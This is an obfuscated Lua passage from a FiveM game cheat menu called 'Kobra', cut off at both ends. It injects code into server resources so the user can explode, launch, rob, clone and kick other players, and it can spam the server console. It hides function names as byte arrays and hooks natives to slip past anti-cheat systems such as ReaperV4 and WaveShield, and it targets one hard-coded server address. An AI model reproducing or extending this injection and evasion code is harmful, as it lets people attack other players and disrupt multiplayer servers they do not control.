                                ]]):format(v379));end}}}}},{icon="",label="Server",type="subMenu",categories={{label="List",tabs={{type="button",label="Select Everyone"},{type="button",label="Un-Select Everyone"},{type="button",label="Clear Selection"},{type="divider",label="Nearby Players"}}},{label="Safe",tabs={{type="button",label="Teleport to Player",desc="This will teleport you to the selected player",onSelect=function() local v380=nil;for v538,v539 in pairs(v27) do if v539 then v380=v538;break;end end if v380 then local v595=GetPlayerFromServerId(v380);if ((v595== -1) or  not DoesEntityExist(GetPlayerPed(v595))) then v269:Notify("error","Kobra","There was an error while trying to teleport to that player! (ERR:1)",3000);v27[v380]=nil;v12:UpdateListMenu();return;end local v596=GetPlayerPed(v595);local v597=GetEntityCoords(v596);local v598=GetEntityHeading(v596);SetEntityCoords(PlayerPedId(),v597.x,v597.y,v597.z,false,false,false,false);SetEntityHeading(PlayerPedId(),v598);v269:Notify("success","Kobra",("You have teleported to %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v380)),v380),1068 + 1932 );else v269:Notify("error","Kobra","You must select a player to do this!",2439 + 561 );end end},{type="checkbox",label="Spectate Player",checked=false,desc="This will attempt to Spectate the player",onSelect=function(v381) local v382=0 -0 ;local v383;while true do if (v382==(0 + 0)) then v383=nil;for v777,v778 in pairs(v27) do if v778 then v383=v777;break;end end v382=3 -2 ;end if (v382==(1 + 0)) then v269:HandleSpectateToggle(v383,v381);break;end end end},{type="button",label="Copy Appearance",desc="Copy Players Clothing",onSelect=function() local v384={};for v540,v541 in pairs(v27) do if v541 then v384[ #v384 + (3 -2) ]=v540;end end if ( #v384==0) then local v599=490 -(99 + 391) ;while true do if ((0 + 0)==v599) then v269:Notify("error","Kobra","You must select a player to do this!",13187 -10187 );return;end end end local v385=v384[2 -1 ];local v386=GetResourceState("ReaperV4")=="started" ;if v386 then MachoInjectThread(0 + 0 ,"any","",string.format([[
                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end
                                        local function findClientIdByServerId(sid)
                                            local players = _g(_b("GetActivePlayers"))()
                                            for _, pid in ipairs(players) do
                                                if _g(_b("GetPlayerServerId"))(pid) == sid then
                                                    return pid
                                                end
                                            end
                                            return -1
                                        end
                                        
                                        local function CopyClothing(targetSid)
                                            local clientId = findClientIdByServerId(targetSid)
                                            if clientId == -1 then
                                                print("CLIENT ID NOT FOUND!")
                                                return
                                            end
                                            
                                            local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                            local myPed = _g(_b("PlayerPedId"))()
                                            
                                            if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                                print("COPYING CLOTHING...")
                                                
                                                -- COPY EVERYTHING - NO CLONING!
                                                _g(_b("SetPedComponentVariation"))(myPed, 1, _g(_b("GetPedDrawableVariation"))(targetPed, 1), _g(_b("GetPedTextureVariation"))(targetPed, 1), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 3, _g(_b("GetPedDrawableVariation"))(targetPed, 3), _g(_b("GetPedTextureVariation"))(targetPed, 3), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 4, _g(_b("GetPedDrawableVariation"))(targetPed, 4), _g(_b("GetPedTextureVariation"))(targetPed, 4), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 6, _g(_b("GetPedDrawableVariation"))(targetPed, 6), _g(_b("GetPedTextureVariation"))(targetPed, 6), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 8, _g(_b("GetPedDrawableVariation"))(targetPed, 8), _g(_b("GetPedTextureVariation"))(targetPed, 8), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 11, _g(_b("GetPedDrawableVariation"))(targetPed, 11), _g(_b("GetPedTextureVariation"))(targetPed, 11), 0)
                                                
                                                -- Copy accessories
                                                _g(_b("SetPedPropIndex"))(myPed, 0, _g(_b("GetPedPropIndex"))(targetPed, 0), _g(_b("GetPedPropTextureIndex"))(targetPed, 0), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 1, _g(_b("GetPedPropIndex"))(targetPed, 1), _g(_b("GetPedPropTextureIndex"))(targetPed, 1), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 2, _g(_b("GetPedPropIndex"))(targetPed, 2), _g(_b("GetPedPropTextureIndex"))(targetPed, 2), true)
                                                
                                                print("CLOTHING COPIED!")
                                            else
                                                print("PED NOT FOUND!")
                                            end
                                        end
                                        
                                        CopyClothing(%d)
                                    ]],v385));else local v600=0 -0 ;local v601;local v602;local v603;local v604;local v605;while true do if (v600==3) then function v605(v872) local v873=v604(v872);if (v873== -(1605 -(1032 + 572))) then local v960=417 -(203 + 214) ;while true do if (v960==(1817 -(568 + 1249))) then print("^1[ERROR] Client ID not found for Server ID: "   .. v872   .. "^0" );return;end end end local v874=v603(v601("GetPlayerPed"))(v873);local v875=v603(v601("PlayerPedId"))();if (v603(v601("DoesEntityExist"))(v874) and v603(v601("DoesEntityExist"))(v875)) then local v961=0 + 0 ;while true do if (v961==(4 -2)) then v603(v601("SetPedPropIndex"))(v875,1,v603(v601("GetPedPropIndex"))(v874,3 -2 ),v603(v601("GetPedPropTextureIndex"))(v874,1307 -(913 + 393) ),true);v603(v601("SetPedPropIndex"))(v875,2,v603(v601("GetPedPropIndex"))(v874,5 -3 ),v603(v601("GetPedPropTextureIndex"))(v874,2),true);print("^2[Kobra] Clothing copied successfully!^0");break;end if (v961==0) then print("^2[Kobra] Copying clothing from Server ID: "   .. v872   .. "^0" );v603(v601("SetPedComponentVariation"))(v875,1,v603(v601("GetPedDrawableVariation"))(v874,1),v603(v601("GetPedTextureVariation"))(v874,1 -0 ),410 -(269 + 141) );v603(v601("SetPedComponentVariation"))(v875,3,v603(v601("GetPedDrawableVariation"))(v874,3),v603(v601("GetPedTextureVariation"))(v874,3),0);v603(v601("SetPedComponentVariation"))(v875,8 -4 ,v603(v601("GetPedDrawableVariation"))(v874,4),v603(v601("GetPedTextureVariation"))(v874,1985 -(362 + 1619) ),0);v961=1626 -(950 + 675) ;end if (v961==1) then v603(v601("SetPedComponentVariation"))(v875,3 + 3 ,v603(v601("GetPedDrawableVariation"))(v874,1185 -(216 + 963) ),v603(v601("GetPedTextureVariation"))(v874,6),0);v603(v601("SetPedComponentVariation"))(v875,1295 -(485 + 802) ,v603(v601("GetPedDrawableVariation"))(v874,567 -(432 + 127) ),v603(v601("GetPedTextureVariation"))(v874,8),1073 -(1065 + 8) );v603(v601("SetPedComponentVariation"))(v875,7 + 4 ,v603(v601("GetPedDrawableVariation"))(v874,11),v603(v601("GetPedTextureVariation"))(v874,1612 -(635 + 966) ),0);v603(v601("SetPedPropIndex"))(v875,0 + 0 ,v603(v601("GetPedPropIndex"))(v874,0),v603(v601("GetPedPropTextureIndex"))(v874,0),true);v961=44 -(5 + 37) ;end end else print("^3[WARNING] Target or local ped does not exist.^0");end end v605(v385);break;end if (v600==(0 -0)) then v601=nil;function v601(v876) local v877={};for v928=1 + 0 , #v876 do v877[v928]=string.byte(v876,v928);end return v877;end v602=nil;v600=1 -0 ;end if (v600==(1 + 1)) then v604=nil;function v604(v878) local v879=0 -0 ;local v880;while true do if ((3 -2)==v879) then return  -(1 -0);end if (v879==(0 -0)) then v880=v603(v601("GetActivePlayers"))();for v1083,v1084 in ipairs(v880) do if (v603(v601("GetPlayerServerId"))(v1084)==v878) then return v1084;end end v879=1 + 0 ;end end end v605=nil;v600=532 -(318 + 211) ;end if (v600==1) then function v602(v881) local v882="";for v930=4 -3 , #v881 do v882=v882   .. string.char(v881[v930]) ;end return v882;end v603=nil;function v603(v883) local v884=1587 -(963 + 624) ;local v885;local v886;while true do if (v884==1) then return v886;end if (v884==(0 + 0)) then v885=v602(v883);v886=_G[v885];v884=1;end end end v600=848 -(518 + 328) ;end end end v269:Notify("success","Kobra","Copied clothing!",11655 -6655 );end},{type="button",label="Launch Player",desc="This will attempt to launch the player into the sky",onSelect=function() local v387=0;local v388;while true do if ((1 -0)==v387) then if ( #v388==(317 -(301 + 16))) then local v846=0;while true do if (v846==0) then v269:Notify("error","Kobra","You must select a player to do this!",8792 -5792 );return;end end end v269:HandleLaunchPlayer(v388);v387=5 -3 ;end if (v387==(0 -0)) then v388={};for v779,v780 in pairs(v27) do if v780 then v388[ #v388 + 1 + 0 ]=v779;end end v387=1;end if (v387==(2 + 0)) then v269:Notify("success","Kobra","Attempting to TEST",10674 -5674 );break;end end end}}},{label="Risky",tabs={{type="button",label="Explode Player",desc="This will attempt to explode the player using a vehicle",onSelect=function() local v389={};for v542,v543 in pairs(v27) do if v543 then v389[ #v389 + (3 -2) ]=v542;end end if ( #v389==(0 + 0)) then v269:Notify("error","Kobra","You must select a player to do this!",4019 -(829 + 190) );return;end for v544,v545 in ipairs(v389) do local v546=v545;local v547=GetPlayerFromServerId(v545);if ((v547== -1) or  not DoesEntityExist(GetPlayerPed(v547))) then v269:Notify("error","Kobra","You must select a player to do this!",10703 -7703 );v27[v545]=nil;return;else local v720=[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                local func = _G[decode(n)]
                                                if not func then
                                                    return nil
                                                end
                                                return func
                                            end
                                            local function wait(n)
                                                local waitFunc = g({87,97,105,116}) -- "Wait"
                                                if not waitFunc then
                                                    return
                                                end
                                                return waitFunc(n)
                                            end

                                            local vehicleName = decode({109,97,110,99,104,101,122}) -- "manchez"
                                            local requestModel = g({82,101,113,117,101,115,116,77,111,100,101,108})
                                            if not requestModel then return end
                                            requestModel(vehicleName)

                                            local hasModelLoaded = g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})
                                            if hasModelLoaded then
                                                local attempts = 0
                                                while not hasModelLoaded(vehicleName) and attempts < 20 do
                                                    wait(500)
                                                    attempts = attempts + 1
                                                end
                                                if attempts >= 20 then
                                                    return
                                                end
                                            end

                                            local getPlayerFromServerId = g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})
                                            if not getPlayerFromServerId then return end
                                            local targetPlayer = getPlayerFromServerId(]]   .. tostring(v546)   .. [[)
                                            if targetPlayer == -1 then
                                                return
                                            end

                                            local getPlayerPed = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                            if not getPlayerPed then return end
                                            local targetPed = getPlayerPed(targetPlayer)
                                            if not targetPed or targetPed == 0 then
                                                return
                                            end

                                            local localPlayerPed = getPlayerPed(-1) -- Get local player ped
                                            if not localPlayerPed or localPlayerPed == 0 then
                                                return
                                            end

                                            local getEntityCoords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})
                                            local getEntityHeading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})
                                            local setEntityHealth = g({83,101,116,69,110,116,105,116,121,72,101,97,108,116,104})
                                            if not getEntityCoords or not getEntityHeading then return end
                                            local targetPos = getEntityCoords(targetPed)
                                            local heading = getEntityHeading(targetPed)

                                            local giveWeapon = g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})
                                            local setCurrentWeapon = g({83,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110})
                                            local getHashKey = g({71,101,116,72,97,115,104,75,101,121})
                                            local shootBullet = g({83,104,111,111,116,83,105,110,103,108,101,66,117,108,108,101,116,66,101,116,119,101,101,110,67,111,111,114,100,115})
                                            local removeWeapon = g({82,101,109,111,118,101,87,101,97,112,111,110,70,114,111,109,80,101,100})
                                            local setMissionEntity = g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})

                                            local pistolHash = getHashKey(decode({87,69,65,80,79,78,95,65,80,80,73,83,84,79,76}))
                                            giveWeapon(localPlayerPed, pistolHash, 200, false, true)
                                            setCurrentWeapon(localPlayerPed, pistolHash, true)

                                            wait(1000) -- Wait 3 seconds before spawning vehicle

                                            local createVehicle = g({67,114,101,97,116,101,86,101,104,105,99,108,101})
                                            if not createVehicle then return end
                                            local vehicleSpawnPos = {x = targetPos.x + 2.0, y = targetPos.y, z = targetPos.z + 0.2} -- Offset 5 units, slight Z lift
                                            local vehicle = createVehicle(vehicleName, vehicleSpawnPos.x, vehicleSpawnPos.y, vehicleSpawnPos.z, heading, true, true)
                                            if not vehicle or vehicle == 0 then
                                                return
                                            end

                                            if setMissionEntity then
                                                setMissionEntity(vehicle, true, true)
                                            end
                                            if setEntityHealth then
                                                setEntityHealth(vehicle, 10) -- Set low health for easy explosion
                                            end

                                            for i = 1, 60 do
                                                local vehicleCoords = getEntityCoords(vehicle) -- Get updated vehicle coords each time
                                                shootBullet(
                                                    targetPos.x, targetPos.y, targetPos.z + 1.0, -- Start near target ped
                                                    vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 0.3, -- Aim at vehicle center (tighter offset)
                                                    2000.0, true, pistolHash, localPlayerPed, true, false, 2000.0 -- Higher speed for accuracy
                                                )
                                                wait(1) -- Slightly slower shooting for stability
                                            end

                                            removeWeapon(localPlayerPed, pistolHash)
                                        ]] ;MachoInjectResourceRaw("any",v720,v546);v269:Notify("success","Kobra","Attempting to Explode Player",6326 -1326 );end end v12:UpdateListMenu();end},{type="button",label="Steal Inventory",desc="This will attempt to open the selected players inventory",onSelect=function() local v390={};for v548,v549 in pairs(v27) do if v549 then v390[ #v390 + 1 ]=v548;end end if ( #v390==(0 -0)) then v269:Notify("error","Kobra","You must select a player to do this!",3000);return;end v269:HandleTakeInventory(v390);v269:Notify("success","Kobra","Attempting to steal inventory",5000);end},{type="divider",label="Ped Options"},{type="button",label="Clone Player",onSelect=function() local v391=0 -0 ;local v392;while true do if (v391==(2 + 0)) then v269:Notify("success","Kobra","Cloned Player",5000);break;end if ((613 -(520 + 93))==v391) then v392={};for v781,v782 in pairs(v27) do if v782 then v392[ #v392 + (277 -(259 + 17)) ]=v781;end end v391=1;end if (v391==(1 + 0)) then if ( #v392==(0 + 0)) then local v847=0 -0 ;while true do if (v847==(591 -(396 + 195))) then v269:Notify("error","Kobra","You must select a player to do this!",8704 -5704 );return;end end end v269:HandleClonePlayer(v392);v391=1763 -(440 + 1321) ;end end end},{type="button",label="Attack Clone Player",onSelect=function() local v393=0;local v394;while true do if (v393==1) then if ( #v394==(0 -0)) then local v848=545 -(424 + 121) ;while true do if (v848==(0 + 0)) then v269:Notify("error","Kobra","You must select a player to do this!",3000);return;end end end v269:HandleAttackClonePlayer(v394);v393=2;end if (v393==2) then v269:Notify("success","Kobra","Cloned Player",6347 -(641 + 706) );break;end if (v393==(0 + 0)) then v394={};for v783,v784 in pairs(v27) do if v784 then v394[ #v394 + (441 -(249 + 191)) ]=v783;end end v393=4 -3 ;end end end},{type="divider",label="Vehicle Options"},{type="scrollable",label="Attach Vehicle",scrollType="onEnter",value=1,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","kuruma","zentorno","entityxf","carbonizzare","elegy","massacro","vagner","nightshark","banshee","feltzer2","ruston","bullet","elegy2"},onSelect=function(v395) local v396={};for v550,v551 in pairs(v27) do if v551 then v396[ #v396 + 1 ]=v550;end end if ( #v396==0) then local v606=0 + 0 ;while true do if (v606==0) then v269:Notify("error","Kobra","You must select a player to do this!",3000);return;end end end v12:AttachSelectedVehicle(v396,v395);v269:Notify("success","Kobra","Vehicle Attached to "   ..  #v396   .. " Player(s)" ,5000);end},{type="divider",label="Object Options"},{type="scrollable",label="Vehicle Object",scrollType="onEnter",value=1,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","zentorno","tampa","nightshark","kuruma","buffalo","massacro","ferrari","comet2","issi2","vindicator","baller","baller2"},onSelect=function(v397) local v398=918 -(782 + 136) ;local v399;while true do if ((857 -(112 + 743))==v398) then v12:SpawnSelectedObject(v399);break;end if (v398==0) then v399={};for v785,v786 in pairs(v27) do if v786 then v399[ #v399 + 1 ]=v785;end end v398=1172 -(1026 + 145) ;end if (v398==(1 + 0)) then if ( #v399==(718 -(493 + 225))) then v269:Notify("error","Kobra","You must select at least one player!",3000);return;end v12.GetSelectedObjectModel=function(v787) return v397;end;v398=7 -5 ;end end end},{type="scrollable",label="Attach Prop",scrollType="onEnter",value=1,values={"prop_barrel_02a","prop_cone_float_1","prop_chair_01a","prop_boombox_01","prop_tool_broom","prop_golf_ball","prop_laptop_01a","prop_trafficcone_01a","prop_pizza_box_01","prop_mb_cargo_01a","prop_ld_crate_01a","prop_ld_fueldoor","prop_ld_greenscreen_01","prop_ld_shovel","prop_snow_bottle","prop_snow_locker_01","prop_dummy_01","prop_dummy_02"},onSelect=function(v400) local v401={};for v552,v553 in pairs(v27) do if v553 then v401[ #v401 + (586 -(352 + 233)) ]=v552;end end if ( #v401==(0 -0)) then v269:Notify("error","Kobra","You must select at least one player!",3000);return;end v12.GetSelectedObjectModel=function(v554) return v400;end;v12:SpawnSelectedObject(v401);v269:Notify("success","Kobra","Spawned object '"   .. tostring(v400)   .. "' for "   ..  #v401   .. " player(s)." ,2720 + 2280 );end},{type="scrollable",label="Attach Furniture",scrollType="onEnter",value=575 -(489 + 85) ,values={"prop_table_01","prop_table_02","prop_table_03","prop_chair_02","prop_chair_03","prop_chair_04a","prop_sofa_01","prop_sofa_02","prop_sofa_03","prop_bed_01","prop_bed_02","prop_lamp_01","prop_lamp_02","prop_lamp_03","prop_couch_01","prop_couch_02","prop_tv_01","prop_tv_02","prop_tv_03","prop_computer_01","prop_computer_02","prop_monitor_01","prop_monitor_02"},onSelect=function(v403) local v404=0 + 0 ;local v405;while true do if ((1 + 0)==v404) then if ( #v405==(0 -0)) then local v849=0 -0 ;while true do if (v849==0) then v269:Notify("error","Kobra","You must select at least one player!",920 + 2080 );return;end end end v12.GetSelectedObjectModel=function(v788) return v403;end;v404=2;end if (v404==(2 + 0)) then v12:SpawnSelectedObject(v405);break;end if (v404==(447 -(133 + 314))) then v405={};for v789,v790 in pairs(v27) do if v790 then v405[ #v405 + 1 ]=v789;end end v404=1 + 0 ;end end end},{type="scrollable",label="Attach Misc",scrollType="onEnter",value=214 -(199 + 14) ,values={"prop_beer_bottle","prop_soda_cup","prop_papercup_01","prop_cup_coffee_01","prop_champ_flute","prop_cs_burger_01","prop_cs_burger_02","prop_cs_hotdog_01","prop_cs_pizza_01","prop_cs_sandwich_01","prop_cs_juice_01"},onSelect=function(v406) local v407={};for v555,v556 in pairs(v27) do if v556 then v407[ #v407 + 1 + 0 ]=v555;end end if ( #v407==(0 -0)) then v269:Notify("error","Kobra","You must select at least one player!",4299 -1299 );return;end v12.GetSelectedObjectModel=function(v557) return v406;end;v12:SpawnSelectedObject(v407);v269:Notify("success","Kobra","Spawned object '"   .. tostring(v406)   .. "' for "   ..  #v407   .. " player(s)." ,14846 -9846 );end}}},{label="Vehicle",tabs={{type="button",label="Kick From Vehicle",onSelect=function() local v409=nil;for v558,v559 in pairs(v27) do if v559 then v409=v558;break;end end if v409 then local v607=GetPlayerFromServerId(v409);if (v607== -(1 + 0)) then v269:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:1)",3555 -(443 + 112) );v27[v409]=nil;v12:UpdateListMenu();return;end if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v607))) then v269:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",4479 -(888 + 591) );return;end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v850=2 -1 ,1 + 1  do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function KickFromVehicleNewestV8(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        TaskLeaveVehicle(player, vehicle, 16)
                                                        Wait(450)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v607))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    KickFromVehicleNewestV8(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v27[v409]=true;v269:UpdateListMenu();else v269:Notify("error","Kobra","You must select a player to do this!",11299 -8299 );end end},{type="button",label="Teleport to Ocean",onSelect=function() local v410=nil;for v560,v561 in pairs(v27) do if v561 then v410=v560;break;end end if v410 then local v609=0 + 0 ;local v610;while true do if (v609==(1 + 0)) then if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v610))) then local v931=0 + 0 ;while true do if (v931==(0 -0)) then v269:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",5557 -2557 );return;end end end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v962=1679 -(136 + 1542) ,2 do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function TeleportVehicleToOcean(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        SetEntityCoords(vehicle, 0.0, 0.0, 0.0, false, false, false, false)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v610))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    TeleportVehicleToOcean(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v609=6 -4 ;end if (v609==(2 + 0)) then v27[v410]=true;v269:UpdateListMenu();break;end if (v609==(0 -0)) then v610=GetPlayerFromServerId(v410);if (v610== -1) then v269:Notify("error","Kobra","There was an error while trying to tp the vehicle to the ocean! (ERR:1)",2172 + 828 );v27[v410]=nil;v12:UpdateListMenu();return;end v609=487 -(68 + 418) ;end end else v269:Notify("error","Kobra","You must select a player to do this!",8132 -5132 );end end}}},{label="Triggers",tabs={{type="checkbox",label="Server Console Spam",checked=false,onSelect=function(v411) if v411 then print("Console Spam Started...");v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    if not _G.KobraServerConsoleSpamInitialized then
                                        _G.KobraServerConsoleSpamEnabled = true
                                        _G.KobraServerConsoleSpamInitialized = true

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("CreateThread", function(fn, cb) return fn(cb) end)
                                        HookNative("Wait", function(fn, ms) return fn(ms) end)
                                        HookNative("TriggerEvent", function(fn, ...) return fn(...) end)
                                        HookNative("TriggerServerEvent", function(fn, ...) return fn(...) end)

                                        if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(e, ...) return TriggerEvent(e, ...) end,
                                                TSEvent = function(e, ...) return TriggerServerEvent(e, ...) end
                                            }
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Spam Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(500) -- Anti-detection delay
                                            while _G.KobraServerConsoleSpamInitialized do
                                                if not _G.KobraServerConsoleSpamEnabled then
                                                    Citizen.Wait(500)
                                                else
                                                    _G.Kobra.TSEvent("playerLoaded")
                                                    Citizen.Wait(75)
                                                end
                                            end
                                        end)
                                    else
                                        _G.KobraServerConsoleSpamEnabled = true
                                    end
                                ]]);else print("Console Spam Stopped...");v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    _G.KobraServerConsoleSpamEnabled = false
